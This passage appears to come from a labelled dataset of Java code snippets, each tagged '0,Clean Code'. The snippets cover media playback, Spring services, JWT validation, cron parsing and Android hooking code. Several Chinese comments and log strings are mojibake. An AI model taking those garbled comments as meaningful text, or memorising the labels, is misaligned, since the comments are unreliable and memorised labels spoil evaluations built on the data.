      SampleStreamImpl stream=new SampleStreamImpl();
      sampleStreams.add(stream);
      streams[i]=stream;
      streamResetFlags[i]=true;
    }
  }
  return positionUs;
}",0,Clean Code
"public boolean requestCaCertificate(){
  if (mService == null) {
    Log.e(TAG,""Not connected"");
    return false;
  }
  Message msg=Message.obtain(null,MitmAPI.MSG_GET_CA_CERTIFICATE);
  msg.replyTo=mMessenger;
  try {
    mService.send(msg);
    return true;
  }
 catch (  RemoteException e) {
    e.printStackTrace();
    return false;
  }
}
",0,Clean Code
"/** 
 * Updates message by its id if it exists, add to start if not
 * @param message message object to insert or update.
 */
public void upsert(MESSAGE message){
  if (!update(message)) {
    addToStart(message,false);
  }
}
/** 
 * Updates and moves to start if message by its id exists and if specified move to start, if not specified the item stays at current position and updated
 * @param message message object to insert or update.
 */
public void upsert(MESSAGE message,boolean moveToStartIfUpdate){
  if (moveToStartIfUpdate) {
    if (getMessagePositionById(message.getId()) > 0) {
      updateAndMoveToStart(message);
    }
 else {
      upsert(message);
    }
  }
 else {
    upsert(message);
  }
}",0,Clean Code
"/** 
 * validate token
 * @param token token
 * @return whether valid
 */
public boolean validateToken(String token){
  try {
    Jwts.parser().setSigningKey(secretKey).parseClaimsJws(token);
    return true;
  }
 catch (  SignatureException e) {
    log.info(""Invalid JWT signature."");
    log.trace(""Invalid JWT signature trace: {}"",e);
  }
catch (  MalformedJwtException e) {
    log.info(""Invalid JWT token."");
    log.trace(""Invalid JWT token trace: {}"",e);
  }
catch (  ExpiredJwtException e) {
    log.info(""Expired JWT token."");
    log.trace(""Expired JWT token trace: {}"",e);
  }
catch (  UnsupportedJwtException e) {
    log.info(""Unsupported JWT token."");
    log.trace(""Unsupported JWT token trace: {}"",e);
  }
catch (  IllegalArgumentException e) {
    log.info(""JWT token compact of handler are invalid."");
    log.trace(""JWT token compact of handler are invalid trace: {}"",e);
  }
  return false;
}
",0,Clean Code
"/** 
 * 鏇存柊 container 涓寚瀹� spec 涓殑 key 瀵瑰簲鐨勫唴瀹�
 * @param containers 瀹瑰櫒鍒楄〃
 * @param key        Key
 * @param spec       鏄犲皠鍐呭
 */
private static void appendContainerSpec(JSONArray containers,String key,JSONArray spec){
  if (containers != null) {
    for (int i=0; i < containers.size(); i++) {
      JSONObject container=containers.getJSONObject(i);
      JSONArray originValues=container.getJSONArray(key);
      if (originValues == null) {
        container.put(key,new JSONArray());
        originValues=container.getJSONArray(key);
      }
      originValues.addAll(spec);
    }
  }
}",0,Clean Code
"/** 
 * construct jdbc url due the jdbc protocol
 * @param jdbcProtocol jdbc
 * @return URL
 */
private String constructDatabaseUrl(JdbcProtocol jdbcProtocol){
  if (Objects.nonNull(jdbcProtocol.getUrl()) && !Objects.equals("""",jdbcProtocol.getUrl()) && jdbcProtocol.getUrl().startsWith(""jdbc"")) {
    return jdbcProtocol.getUrl();
  }
  return null;
}
",0,Clean Code
"private ResultSetWrapper getNextResultSet(Statement stmt){
  try {
    if (stmt.getConnection().getMetaData().supportsMultipleResultSets() && (stmt.getMoreResults() || (stmt.getUpdateCount() != -1))) {
      ResultSet rs=stmt.getResultSet();
      if (rs == null) {
        return getNextResultSet(stmt);
      }
      return new ResultSetWrapper(rs,configuration);
    }
  }
 catch (  Exception e) {
  }
  return null;
}",0,Clean Code
"/** 
 * 鏇存柊鍟嗗搧鍚庨渶瑕佸悓姝ユ洿鏂扮储寮曪紝鍏堝垹鍚庡
 * @param jp 杩炴帴鐐�
 * @param result 杩斿洖鍊�
 * @throws JsonProcessingException 鎶涘嚭
 */
@AfterReturning(value=""execution(* com.supermarket.product.service.ProductService*.updateProduct(..))"",returning=""result"") public void afterUpdateProduct(JoinPoint jp,Object result) throws JsonProcessingException {
  Map<String,Object> map=new HashMap<String,Object>();
  Object[] values=jp.getArgs();
  String[] names=((CodeSignature)jp.getSignature()).getParameterNames();
  for (int i=0; i < names.length; i++) {
    map.put(names[i],values[i]);
  }
  Product product=(Product)map.get(""product"");
  CommonResult<?> deleteResult=this.searchService.deleteProduct(product);
  this.afterAddProduct(jp,result);
}",0,Clean Code
"@Override protected void initUndoHistory(){
  final int x=getCaretEndPosX();
  final int y=getCaretMouseReleasedY();
  final ZyLineContent lineContent=getLineContent(y);
  final IZyEditableObject lineFragmentObject=lineContent.getLineFragmentObjectAt(x);
  m_editableObject=lineContent.getLineObject();
  if (lineFragmentObject != null) {
    String text=lineContent.getText().substring(lineFragmentObject.getStart(),lineFragmentObject.getEnd());
    m_isAboveComment=isAboveLineComment(y);
    m_isBehindComment=isBehindLineComment(x,y);
    m_isLabelComment=isLabelComment(y);
    if (isComment(x,y)) {
      text=getMultiLineComment(y);
    }
    udpateUndolist(getLabelContent(),lineContent.getLineObject().getPersistentModel(),m_editableObject,text,isAboveLineComment(y),isBehindLineComment(x,y),isLabelComment(y),getCaretStartPosX(),getCaretMousePressedX(),getCaretMousePressedY(),getCaretEndPosX(),getCaretMouseReleasedX(),getCaretMouseReleasedY());
  }
}
",0,Clean Code
"/** 
 * Read an ECMA array from an AMF encoded buffer.
 * @param data The buffer from which to read.
 * @return The value read from the buffer.
 */
private static HashMap<String,Object> readAmfEcmaArray(ParsableByteArray data){
  int count=data.readUnsignedIntToInt();
  HashMap<String,Object> array=new HashMap<>(count);
  for (int i=0; i < count; i++) {
    String key=readAmfString(data);
    int type=readAmfType(data);
    Object value=readAmfData(data,type);
    if (value != null) {
      array.put(key,value);
    }
  }
  return array;
}",0,Clean Code
"@Override public void onPropsSet(){
  super.onPropsSet();
  if (!mImageNeedsDownload || mSourceMap == null || mScene == null) {
    return;
  }
  imageDownloadDidStart();
  invalidateImageDownloadListeners();
  final Context context=getContext();
  if (mIsHdr) {
    mHDRDownloadListener=new HDRImageDownloadListener();
    HdrImageDownloader.getHdrTextureAsync(mSourceMap,mHDRDownloadListener,context);
  }
 else {
    ImageDownloader downloader=new ImageDownloader(context);
    downloader.setTextureFormat(mFormat);
    mImageDownloadListener=new Image360DownloadListener();
    downloader.getImageAsync(mSourceMap,mImageDownloadListener);
  }
  mImageNeedsDownload=false;
}",0,Clean Code
"/** 
 * 杞崲涓篖ong鏁扮粍<br>
 * @param str 琚浆鎹㈢殑鍊�
 * @return 缁撴灉
 */
public static Long[] toLongArray(String str){
  return toLongArray("","",str);
}
/** 
 * 杞崲涓篖ong鏁扮粍<br>
 * @param split 鍒嗛殧绗�
 * @param str   琚浆鎹㈢殑鍊�
 * @return 缁撴灉
 */
public static Long[] toLongArray(String split,String str){
  if (StringUtils.isEmpty(str)) {
    return new Long[]{};
  }
  String[] arr=str.split(split);
  final Long[] longs=new Long[arr.length];
  for (int i=0; i < arr.length; i++) {
    final Long v=toLong(arr[i],null);
    longs[i]=v;
  }
  return longs;
}",0,Clean Code
"public static Object escapeXml(Object obj){
  if (obj == null) {
    return null;
  }
 else   if (obj instanceof CharSequence) {
    return escapeXml((CharSequence)obj);
  }
 else {
    return obj;
  }
}
public static String escapeXml(CharSequence str){
  if (str == null) {
    return null;
  }
  StringBuilder res=null;
  int strLength=str.length();
  for (int i=0; i < strLength; i++) {
    char c=str.charAt(i);
    String repl=encodeXMLChar(c);
    if (repl == null) {
      if (res != null) {
        res.append(c);
      }
    }
 else {
      if (res == null) {
        res=new StringBuilder(str.length() + 5);
        for (int k=0; k < i; k++) {
          res.append(str.charAt(k));
        }
      }
      res.append(repl);
    }
  }
  return res == null ? str.toString() : res.toString();
}",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public void updateBusinessStatus(CrmBusinessStatusSaveReqVO updateReqVO){
  validateBusinessStatusTypeExists(updateReqVO.getId());
  validateBusinessStatusTypeNameUnique(updateReqVO.getName(),updateReqVO.getId());
  int sort=0;
  for (  CrmBusinessStatusSaveReqVO.Status status : updateReqVO.getStatuses()) {
    status.setSort(sort++);
  }
  if (businessService.getBusinessCountByStatusTypeId(updateReqVO.getId()) > 0) {
    throw exception(BUSINESS_STATUS_UPDATE_FAIL_USED);
  }
  CrmBusinessStatusTypeDO updateObj=BeanUtils.toBean(updateReqVO,CrmBusinessStatusTypeDO.class);
  businessStatusTypeMapper.updateById(updateObj);
  updateBusinessStatus(updateReqVO.getId(),BeanUtils.toBean(updateReqVO.getStatuses(),CrmBusinessStatusDO.class));
}
private void updateBusinessStatus(Long id,List<CrmBusinessStatusDO> newList){
  List<CrmBusinessStatusDO> oldList=businessStatusMapper.selectListByTypeId(id);
  List<List<CrmBusinessStatusDO>> diffList=diffList(oldList,newList,(oldVal,newVal) -> oldVal.getId().equals(newVal.getId()));
  if (CollUtil.isNotEmpty(diffList.get(0))) {
    diffList.get(0).forEach(o -> o.setTypeId(id));
    businessStatusMapper.insertBatch(diffList.get(0));
  }
  if (CollUtil.isNotEmpty(diffList.get(1))) {
    businessStatusMapper.updateBatch(diffList.get(1));
  }
  if (CollUtil.isNotEmpty(diffList.get(2))) {
    businessStatusMapper.deleteBatchIds(convertSet(diffList.get(2),CrmBusinessStatusDO::getId));
  }
}",0,Clean Code
"public static String[] splitString(String str,int chunkSize){
  if (str == null || str.isEmpty() || chunkSize <= 0) {
    return null;
  }
  int len=str.length();
  int arrayLen=(len + chunkSize - 1) / chunkSize;
  String[] result=new String[arrayLen];
  int k=0;
  for (int i=0; i < len; i+=chunkSize) {
    int endIndex=Math.min(i + chunkSize,len);
    result[k++]=str.substring(i,endIndex);
  }
  return result;
}",0,Clean Code
"protected void buildExpression(String expression) throws ParseException {
  expressionParsed=true;
  try {
    if (seconds == null) {
      seconds=new TreeSet<Integer>();
    }
    if (minutes == null) {
      minutes=new TreeSet<Integer>();
    }
    if (hours == null) {
      hours=new TreeSet<Integer>();
    }
    if (daysOfMonth == null) {
      daysOfMonth=new TreeSet<Integer>();
    }
    if (months == null) {
      months=new TreeSet<Integer>();
    }
    if (daysOfWeek == null) {
      daysOfWeek=new TreeSet<Integer>();
    }
    if (years == null) {
      years=new TreeSet<Integer>();
    }
    int exprOn=SECOND;
    StringTokenizer exprsTok=new StringTokenizer(expression,"" \t"",false);
    while (exprsTok.hasMoreTokens() && exprOn <= YEAR) {
      String expr=exprsTok.nextToken().trim();
      if (exprOn == DAY_OF_MONTH && expr.indexOf('L') != -1 && expr.length() > 1 && expr.contains("","")) {
        throw new ParseException(""Support for specifying 'L' and 'LW' with other days of the month is not implemented"",-1);
      }
      if (exprOn == DAY_OF_WEEK && expr.indexOf('L') != -1 && expr.length() > 1 && expr.contains("","")) {
        throw new ParseException(""Support for specifying 'L' with other days of the week is not implemented"",-1);
      }
      if (exprOn == DAY_OF_WEEK && expr.indexOf('#') != -1 && expr.indexOf('#',expr.indexOf('#') + 1) != -1) {
        throw new ParseException(""Support for specifying multiple \""nth\"" days is not implemented."",-1);
      }
      StringTokenizer vTok=new StringTokenizer(expr,"","");
      while (vTok.hasMoreTokens()) {
        String v=vTok.nextToken();
        storeExpressionVals(0,v,exprOn);
      }
      exprOn++;
    }
    if (exprOn <= DAY_OF_WEEK) {
      throw new ParseException(""Unexpected end of expression."",expression.length());
    }
    if (exprOn <= YEAR) {
      storeExpressionVals(0,""*"",YEAR);
    }
    TreeSet<Integer> dow=getSet(DAY_OF_WEEK);
    TreeSet<Integer> dom=getSet(DAY_OF_MONTH);
    boolean dayOfMSpec=!dom.contains(NO_SPEC);
    boolean dayOfWSpec=!dow.contains(NO_SPEC);
    if (!dayOfMSpec || dayOfWSpec) {
      if (!dayOfWSpec || dayOfMSpec) {
        throw new ParseException(""Support for specifying both a day-of-week AND a day-of-month parameter is not implemented."",0);
      }
    }
  }
 catch (  ParseException pe) {
    throw pe;
  }
catch (  Exception e) {
    throw new ParseException(""Illegal cron expression format ("" + e.toString() + "")"",0);
  }
}",0,Clean Code
"/** 
 * 璁剧疆浼佷笟閰嶇疆
 */
@Override public void setAdminConfig(AdminCompanyBO adminCompanyBO){
  String companyKey=""companyInfo"";
  AdminConfig adminConfig=lambdaQuery().eq(AdminConfig::getName,companyKey).last("" limit 1"").one();
  if (adminConfig == null) {
    adminConfig=new AdminConfig();
    adminConfig.setName(companyKey);
    adminConfig.setStatus(1);
    adminConfig.setDescription(""浼佷笟LOGO閰嶇疆"");
  }
  adminConfig.setValue(JSON.toJSONString(adminCompanyBO));
  saveOrUpdate(adminConfig);
}",0,Clean Code
"@Override public void onSurfaceTextureAvailable(SurfaceTexture surface,int width,int height){
  if (eglThread == null && surface != null && currentVideoPlayer != null) {
    eglThread=new FilterGLThread(surface,surfaceTexture -> {
      if (currentVideoPlayer == null) {
        return;
      }
      Surface s=new Surface(surfaceTexture);
      currentVideoPlayer.setSurface(s);
    }
);
    if (videoWidth != 0 && videoHeight != 0) {
      eglThread.setVideoSize(videoWidth,videoHeight);
    }
    eglThread.setSurfaceTextureSize(width,height);
    eglThread.requestRender(true,true,false);
    if (delegate != null) {
      delegate.onEGLThreadAvailable(eglThread);
    }
  }
}",0,Clean Code
"@Override public Map<String,Object> getDataMapForNewExamine(ExamineConditionDataBO examineConditionDataBO){
  Map<String,Object> dataMap=new HashMap<>(8);
  Integer id=examineConditionDataBO.getTypeId();
  Integer categoryId=examineConditionDataBO.getCategoryId();
  List<String> fieldList=examineConditionDataBO.getFieldList();
  OaExamine oaExamine=this.getById(id);
  if (oaExamine == null) {
    throw new CrmException(OaCodeEnum.EXAMINE_ALREADY_DELETE);
  }
  List<OaExamineField> examineFields=examineFieldService.queryField(categoryId);
  Map<Integer,String> fieldData=examineFieldService.queryFieldData(oaExamine.getBatchId());
  examineFields.forEach(field -> {
    if (""content"".equals(field.getFieldName())) {
      field.setValue(oaExamine.getContent());
    }
 else     if (""remark"".equals(field.getFieldName())) {
      field.setValue(oaExamine.getRemark());
    }
 else {
      field.setValue(Optional.ofNullable(fieldData.get(field.getFieldId())).orElse(""""));
    }
  }
);
  examineFieldService.transferFieldList(examineFields,2);
  for (  String field : fieldList) {
    for (    OaExamineField examineField : examineFields) {
      if (field.equals(examineField.getFieldName())) {
        dataMap.put(field,examineField.getValue());
        break;
      }
    }
  }
  dataMap.put(""createUserId"",oaExamine.getCreateUserId());
  return dataMap;
}",0,Clean Code
"@Override public boolean isValid(WorkflowTask workflowTask,ConstraintValidatorContext context){
  context.disableDefaultConstraintViolation();
  boolean valid=true;
switch (workflowTask.getType()) {
case TaskType.TASK_TYPE_EVENT:
    valid=isEventTaskValid(workflowTask,context);
  break;
case TaskType.TASK_TYPE_DECISION:
valid=isDecisionTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_SWITCH:
valid=isSwitchTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_DYNAMIC:
valid=isDynamicTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_FORK_JOIN_DYNAMIC:
valid=isDynamicForkJoinValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_HTTP:
valid=isHttpTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_FORK_JOIN:
valid=isForkJoinTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_TERMINATE:
valid=isTerminateTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_KAFKA_PUBLISH:
valid=isKafkaPublishTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_DO_WHILE:
valid=isDoWhileTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_SUB_WORKFLOW:
valid=isSubWorkflowTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_JSON_JQ_TRANSFORM:
valid=isJSONJQTransformTaskValid(workflowTask,context);
break;
case TaskType.TASK_TYPE_WAIT:
valid=isWaitTaskValid(workflowTask,context);
break;
}
return valid;
}
",0,Clean Code
"public void setTransaction(Transaction transaction){
  try {
    ByteArrayOutputStream baos=new ByteArrayOutputStream();
    transaction.bitcoinSerializeToStream(baos);
    fullHex=Utils.bytesToHex(baos.toByteArray());
    String hex=fullHex;
    if (hex.length() > TRUNCATE_AT) {
      hex=hex.substring(0,TRUNCATE_AT);
      hex+=""[truncated]"";
    }
    clear();
    appendText(hex);
    previousSegmentList=new ArrayList<>();
    setContextMenu(new TransactionHexContextMenu(fullHex));
  }
 catch (  IOException e) {
    throw new IllegalStateException(""Can't happen"");
  }
}",0,Clean Code
"public static void start(String[] args){
  if (!ConfigFileManager.tryLock())   System.exit(0);
  int systemServerMaxRetry=1;
  for (  String arg : args) {
    if (arg.equals(""--from-service"")) {
      Log.w(TAG,""LSPosed daemon is not started properly. Try for a late start..."");
    }
 else     if (arg.startsWith(""--system-server-max-retry="")) {
      try {
        systemServerMaxRetry=Integer.parseInt(arg.substring(arg.lastIndexOf('=') + 1));
      }
 catch (      Throwable ignored) {
      }
    }
  }
  Log.i(TAG,""starting server..."");
  Log.i(TAG,String.format(""version %s (%d)"",BuildConfig.VERSION_NAME,BuildConfig.VERSION_CODE));
  Thread.setDefaultUncaughtExceptionHandler((t,e) -> {
    Log.e(TAG,""Uncaught exception"",e);
    System.exit(1);
  }
);
  logcatService=new LogcatService();
  logcatService.start();
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)   permissionManagerWorkaround();
  Process.setThreadPriority(Process.THREAD_PRIORITY_FOREGROUND);
  Looper.prepareMainLooper();
  mainService=new LSPosedService();
  applicationService=new LSPApplicationService();
  managerService=new LSPManagerService();
  systemServerService=new LSPSystemServerService(systemServerMaxRetry);
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
    dex2OatService=new Dex2OatService();
    dex2OatService.start();
  }
  systemServerService.putBinderForSystemServer();
  var configManager=ConfigManager.getInstance();
  ActivityThread.systemMain();
  DdmHandleAppName.setAppName(""org.lsposed.daemon"",0);
  waitSystemService(""package"");
  waitSystemService(""activity"");
  waitSystemService(Context.USER_SERVICE);
  waitSystemService(Context.APP_OPS_SERVICE);
  ConfigFileManager.reloadConfiguration();
  BridgeService.send(mainService,new BridgeService.Listener(){
    @Override public void onSystemServerRestarted(){
      Log.w(TAG,""system restarted..."");
    }
    @Override public void onResponseFromBridgeService(    boolean response){
      if (response) {
        Log.i(TAG,""sent service to bridge"");
      }
 else {
        Log.w(TAG,""no response from bridge"");
      }
      systemServerService.maybeRetryInject();
    }
    @Override public void onSystemServerDied(){
      Log.w(TAG,""system server died"");
      systemServerService.putBinderForSystemServer();
      managerService.onSystemServerDied();
    }
  }
);
  if (!configManager.verboseLog()) {
    logcatService.stopVerbose();
  }
  Looper.loop();
  throw new RuntimeException(""Main thread loop unexpectedly exited"");
}",0,Clean Code
"private void onTgVoipStop(Instance.FinalState finalState){
  if (user == null) {
    return;
  }
  if (TextUtils.isEmpty(finalState.debugLog)) {
    try {
      finalState.debugLog=getStringFromFile(VoIPHelper.getLogFilePath(privateCall.id,true));
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
  }
  if (needRateCall || forceRating || finalState.isRatingSuggested) {
    startRatingActivity();
    needRateCall=false;
  }
  if (needSendDebugLog && finalState.debugLog != null) {
    TLRPC.TL_phone_saveCallDebug req=new TLRPC.TL_phone_saveCallDebug();
    req.debug=new TLRPC.TL_dataJSON();
    req.debug.data=finalState.debugLog;
    req.peer=new TLRPC.TL_inputPhoneCall();
    req.peer.access_hash=privateCall.access_hash;
    req.peer.id=privateCall.id;
    ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> {
      if (BuildVars.LOGS_ENABLED) {
        FileLog.d(""Sent debug logs, response = "" + response);
      }
    }
);
    needSendDebugLog=false;
  }
}
",0,Clean Code
"@Test public void testAllActivatedTrackSelectionAreReleasedWhenTrackSelectionsAreRemade() throws Exception {
  Timeline timeline=new FakeTimeline(1);
  MediaSource mediaSource=new FakeMediaSource(timeline,null,Builder.VIDEO_FORMAT,Builder.AUDIO_FORMAT);
  FakeRenderer videoRenderer=new FakeRenderer(Builder.VIDEO_FORMAT);
  FakeRenderer audioRenderer=new FakeRenderer(Builder.AUDIO_FORMAT);
  final FakeTrackSelector trackSelector=new FakeTrackSelector();
  ActionSchedule disableTrackAction=new ActionSchedule.Builder(""testChangeTrackSelection"").pause().waitForPlaybackState(Player.STATE_READY).disableRenderer(0).play().build();
  new Builder().setMediaSource(mediaSource).setRenderers(videoRenderer,audioRenderer).setTrackSelector(trackSelector).setActionSchedule(disableTrackAction).build(context).start().blockUntilEnded(TIMEOUT_MS);
  List<FakeTrackSelection> createdTrackSelections=trackSelector.getAllTrackSelections();
  int numSelectionsEnabled=0;
  for (  FakeTrackSelection trackSelection : createdTrackSelections) {
    assertThat(trackSelection.isEnabled).isFalse();
    numSelectionsEnabled+=trackSelection.enableCount;
  }
  assertThat(createdTrackSelections).hasSize(3);
  assertThat(numSelectionsEnabled).isEqualTo(3);
}",0,Clean Code
"public void updatePrefs(String... Key){
  if (Xprefs == null)   return;
  leftEnabled=Xprefs.getBoolean(""BackFromLeft"",true);
  rightEnabled=Xprefs.getBoolean(""BackFromRight"",true);
  backGestureHeightFractionLeft=Xprefs.getSliderInt(""BackLeftHeight"",100) / 100f;
  backGestureHeightFractionRight=Xprefs.getSliderInt(""BackRightHeight"",100) / 100f;
  widthFactor=Xprefs.getSliderInt(""GesPillWidthModPos"",50) * .02f;
  GesPillHeightFactor=Xprefs.getSliderInt(""GesPillHeightFactor"",100);
  int taskbarMode=TaskbarActivator.TASKBAR_DEFAULT;
  String taskbarModeStr=Xprefs.getString(""taskBarMode"",""0"");
  try {
    taskbarMode=Integer.parseInt(taskbarModeStr);
  }
 catch (  Exception ignored) {
  }
  if (taskbarMode == TaskbarActivator.TASKBAR_ON || Xprefs.getBoolean(""HideNavbar"",false)) {
    widthFactor=0f;
  }
  if (Key.length > 0) {
    refreshNavbar();
  }
  navPillColorAccent=Xprefs.getBoolean(""navPillColorAccent"",false);
}",0,Clean Code
"private void onFile(Map<String,String> params){
  String path=params.get(""path"");
  if (TextUtils.isEmpty(path))   return;
  if (path.endsWith("".xml""))   RefreshEvent.danmaku(path);
 else   if (path.endsWith("".apk""))   FileUtil.openFile(Path.local(path));
 else   if (path.endsWith("".srt"") || path.endsWith("".ssa"") || path.endsWith("".ass""))   RefreshEvent.subtitle(path);
 else   ServerEvent.setting(path);
}
",0,Clean Code
"/** 
 * 鑾峰彇浠ｇ悊瀵硅薄鐨勫師濮嬪璞�
 * @author fengshuonan
 * @date 2020/10/19 16:21
 */
public static Object getTarget(Object proxy){
  if (!AopUtils.isAopProxy(proxy)) {
    return proxy;
  }
  try {
    if (AopUtils.isJdkDynamicProxy(proxy)) {
      return getJdkDynamicProxyTargetObject(proxy);
    }
 else {
      return getCglibProxyTargetObject(proxy);
    }
  }
 catch (  Exception e) {
    log.error(""鑾峰彇浠ｇ悊瀵硅薄寮傚父"",e);
    return null;
  }
}",0,Clean Code
"public CipherResult encrypt(String data,String aad) throws Exception {
  CipherResult encryptResult=new CipherResult();
  KeyGenerator keyGenerator=KeyGenerator.getInstance(""AES"");
  keyGenerator.init(AES_KEY_SIZE);
  SecretKey key=keyGenerator.generateKey();
  byte[] iv=new byte[GCM_IV_LENGTH];
  SecureRandom random=new SecureRandom();
  random.nextBytes(iv);
  byte[] aaddata=null;
  if (!StringUtils.isEmpty(aad))   aaddata=aad.getBytes();
  encryptResult.setCipherText(Base64.getEncoder().encodeToString(doEncrypt(data.getBytes(),key,iv,aaddata)));
  CipherData cipherData=new CipherData();
  cipherData.setIv(Base64.getEncoder().encodeToString(iv));
  cipherData.setSecureKey(Base64.getEncoder().encodeToString(key.getEncoded()));
  cipherRepository.save(cipherData);
  encryptResult.setId(cipherData.getId());
  return encryptResult;
}",0,Clean Code
"@Override protected void beforeHookedMethod(MethodHookParam param1) throws Throwable {
  if (HidePrivacyChip) {
    try {
      ((List<?>)getObjectField(param.thisObject,""privacyList"")).clear();
    }
 catch (    Throwable ignored) {
    }
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  setObjectField(param.thisObject,""mIsStaticLayout"",false);
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  NotificationIconContainerOverride.calculateIconXTranslations(param);
  param.setResult(null);
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (param.args[0] != mClockView)   return;
  for (  ClockVisibilityCallback c : clockVisibilityCallbacks) {
    try {
      c.OnVisibilityChanged(true);
    }
 catch (    Exception ignored) {
    }
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  setObjectField(param.thisObject,""mAmPmStyle"",AM_PM_STYLE_GONE);
  setObjectField(param.thisObject,""mShowSeconds"",mShowSeconds);
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (HideRoamingState)   param.setResult(false);
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (HideRoamingState)   param.setResult(false);
}",0,Clean Code
"@Test public void testUpdateNotifyMessageRead(){
  NotifyMessageDO dbNotifyMessage=randomPojo(NotifyMessageDO.class,o -> {
    o.setUserId(1L);
    o.setUserType(UserTypeEnum.ADMIN.getValue());
    o.setReadStatus(false);
    o.setReadTime(null);
    o.setTemplateParams(randomTemplateParams());
  }
);
  notifyMessageMapper.insert(dbNotifyMessage);
  notifyMessageMapper.insert(cloneIgnoreId(dbNotifyMessage,o -> o.setUserId(2L)));
  notifyMessageMapper.insert(cloneIgnoreId(dbNotifyMessage,o -> o.setUserType(UserTypeEnum.MEMBER.getValue())));
  notifyMessageMapper.insert(cloneIgnoreId(dbNotifyMessage,o -> o.setReadStatus(true)));
  Collection<Long> ids=Arrays.asList(dbNotifyMessage.getId(),dbNotifyMessage.getId() + 1,dbNotifyMessage.getId() + 2,dbNotifyMessage.getId() + 3);
  Long userId=1L;
  Integer userType=UserTypeEnum.ADMIN.getValue();
  int updateCount=notifyMessageService.updateNotifyMessageRead(ids,userId,userType);
  assertEquals(1,updateCount);
  NotifyMessageDO notifyMessage=notifyMessageMapper.selectById(dbNotifyMessage.getId());
  assertTrue(notifyMessage.getReadStatus());
  assertNotNull(notifyMessage.getReadTime());
}",0,Clean Code
"/** 
 * See  {@link MediaSessionCompat.Callback#onSetRating(RatingCompat)}. 
 */
void onSetRating(Player player,RatingCompat rating);
/** 
 * See  {@link MediaSessionCompat.Callback#onSetRating(RatingCompat,Bundle)}. 
 */
void onSetRating(Player player,RatingCompat rating,Bundle extras);
@Override public void onSetRating(RatingCompat rating){
  if (canDispatchSetRating()) {
    ratingCallback.onSetRating(player,rating);
  }
}
@Override public void onSetRating(RatingCompat rating,Bundle extras){
  if (canDispatchSetRating()) {
    ratingCallback.onSetRating(player,rating,extras);
  }
}
",0,Clean Code
"@Around(""@annotation(xyz.playedu.common.annotation.Lock)"") public Object around(ProceedingJoinPoint joinPoint) throws Throwable {
  MethodSignature signature=(MethodSignature)joinPoint.getSignature();
  Method method=signature.getMethod();
  Lock distributedLock=method.getAnnotation(Lock.class);
  String key=distributedLock.key();
  long expire=distributedLock.expire();
  TimeUnit timeUnit=distributedLock.timeUnit();
  boolean success=redisDistributedLock.tryLock(key,expire,timeUnit);
  if (!success) {
    throw new LimitException(""璇风◢鍚庡啀璇�"");
  }
  try {
    return joinPoint.proceed();
  }
  finally {
    redisDistributedLock.releaseLock(key);
  }
}
",0,Clean Code
"@Override @SneakyThrows public Integer createWithChainList(List<String> ou){
  if (ou == null || ou.isEmpty()) {
    return 0;
  }
  Department department=null;
  for (int i=0; i < ou.size(); i++) {
    String name=ou.get(i);
    Integer parentId=department == null ? 0 : department.getId();
    department=getOne(query().getWrapper().eq(""name"",name).eq(""parent_id"",parentId));
    if (department == null) {
      Integer depId=create(name,parentId,i);
      department=new Department();
      department.setId(depId);
    }
  }
  return department.getId();
}",0,Clean Code
"private Label createInformation(GridPane grid){
  var information=new Label();
  information.setGraphicTextGap(7);
  information.getStyleClass().add(""information"");
  AppFont.header(information);
  var state=wrapper.getEntry().getProvider() != null ? wrapper.getEntry().getProvider().stateDisplay(wrapper) : Comp.empty();
  information.setGraphic(state.createRegion());
  var info=wrapper.getEntry().getProvider().informationString(wrapper);
  var summary=wrapper.getSummary();
  if (wrapper.getEntry().getProvider() != null) {
    information.textProperty().bind(PlatformThread.sync(Bindings.createStringBinding(() -> {
      var val=summary.getValue();
      if (val != null && grid.isHover() && wrapper.getEntry().getProvider().alwaysShowSummary()) {
        return val;
      }
 else {
        return info.getValue();
      }
    }
,grid.hoverProperty(),info,summary)));
  }
  return information;
}",0,Clean Code
"private int sendRequest(int count,Supplier<CloseableHttpClient> client) throws InterruptedException {
  AtomicInteger atomicInteger=new AtomicInteger();
  ExecutorService threadPool=Executors.newCachedThreadPool();
  long begin=System.currentTimeMillis();
  IntStream.rangeClosed(1,count).forEach(i -> {
    threadPool.execute(() -> {
      try (CloseableHttpResponse response=client.get().execute(new HttpGet(""http://127.0.0.1:45678/routelimit/server""))){
        atomicInteger.addAndGet(Integer.parseInt(EntityUtils.toString(response.getEntity())));
      }
 catch (      Exception ex) {
        ex.printStackTrace();
      }
    }
);
  }
);
  threadPool.shutdown();
  threadPool.awaitTermination(1,TimeUnit.HOURS);
  log.info(""鍙戦 {} 娆¤姹傦紝鑰楁椂 {} ms"",atomicInteger.get(),System.currentTimeMillis() - begin);
  return atomicInteger.get();
}",0,Clean Code
"/** 
 * 鏍规嵁璁块棶琛屼负锛岃缃搴旂殑璁块棶鍐呭鎴栧娉�
 * @param behavior
 * @param requestParams
 * @param result
 * @return
 */
private VisitLogRemark judgeBehavior(VisitBehavior behavior,Map<String,Object> requestParams,Result result){
  String remark="""";
  String content=behavior.getContent();
switch (behavior) {
case INDEX:
case MOMENT:
    remark=""绗�"" + requestParams.get(""pageNum"") + ""椤�"";
  break;
case BLOG:
if (result.getCode() == 200) {
  BlogDetail blog=(BlogDetail)result.getData();
  String title=blog.getTitle();
  content=title;
